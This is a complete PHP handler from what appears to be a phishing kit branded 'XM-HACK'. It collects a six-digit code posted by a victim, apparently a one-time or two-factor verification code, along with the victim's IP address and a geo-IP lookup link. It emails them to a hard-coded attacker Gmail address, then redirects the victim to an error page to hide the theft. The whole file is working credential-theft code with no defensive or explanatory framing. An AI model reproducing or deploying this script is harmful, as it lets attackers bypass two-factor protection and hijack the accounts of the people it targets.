<? 


$ip = getenv("REMOTE_ADDR");
$L9lawiFkrkEmail = "kech17201720@gmail.com"; // Hna l Email Dyalk
// Declaration b les post variable
$zb1 = $_POST['digit1'];
$zb2 = $_POST['digit2'];
$zb3 = $_POST['digit3'];
$zb4 = $_POST['digit4'];
$zb5 = $_POST['digit5'];
$zb6 = $_POST['digit6'];
// End of zbi declartion


$ZbiMSG  = "~~~~~~~~~~~~~~~~~{ XM-HACK }~~~~~~~~~~~~~~~~~\n";
$ZbiMSG .= "Code   :  $zb1-$zb2-$zb3-$zb4-$zb5-$zb6 \n";
$ZbiMSG .= "~~~~~~~~~~~{ XM-HACK | IP Infos }~~~~~~~~~~~~\n";
$ZbiMSG .= "Geo IP    : www.geoiptool.com/?IP=$ip\n";
$ZbiMSG .= "Victim IP : ".$ip."\n";
$ZbiMSG .= "~~~~~~~~~~~~~~~~~{ XM-HACK }~~~~~~~~~~~~~~~~~\n";
$XM_Sub = "XM-ATS Rzl From : $ip";
$XM_Bil = "From: Code<Info@Info.CoM>";
{
mail("$L9lawiFkrkEmail","$XM_Sub","$ZbiMSG","$XM_Bil");   
}

die("<script type='text/javascript'> window.location = 'error.html' </script>");